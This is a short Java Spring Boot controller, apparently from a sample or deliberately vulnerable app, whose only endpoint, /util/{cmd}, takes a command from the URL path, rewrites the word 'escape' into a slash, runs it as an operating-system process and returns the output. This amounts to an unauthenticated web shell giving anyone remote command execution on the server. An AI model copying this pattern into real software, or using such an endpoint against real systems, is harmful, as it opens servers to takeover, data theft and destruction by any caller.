package com.example.springboot;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import javax.websocket.server.PathParam;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class UtilController {
    public static Logger logger = LoggerFactory.getLogger(UtilController.class);
	@GetMapping("/util/{cmd}")
	public String executeCommand(@PathVariable("cmd") String cmd) throws IOException {
        
		logger.info("cmd {}",cmd);
		cmd = cmd.replace("escape", "/");
		ProcessBuilder processBuilder = new ProcessBuilder();
		String[] splitCmd = cmd.split(" ");
		processBuilder.command(splitCmd);
		Process process = processBuilder.start();
		StringBuffer resultBuffer = new StringBuffer();
		try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
			String line;
			while ((line = reader.readLine()) != null) {
				System.out.println(line);
				resultBuffer.append(line);
			}
		}
		return resultBuffer.toString();
	}
}
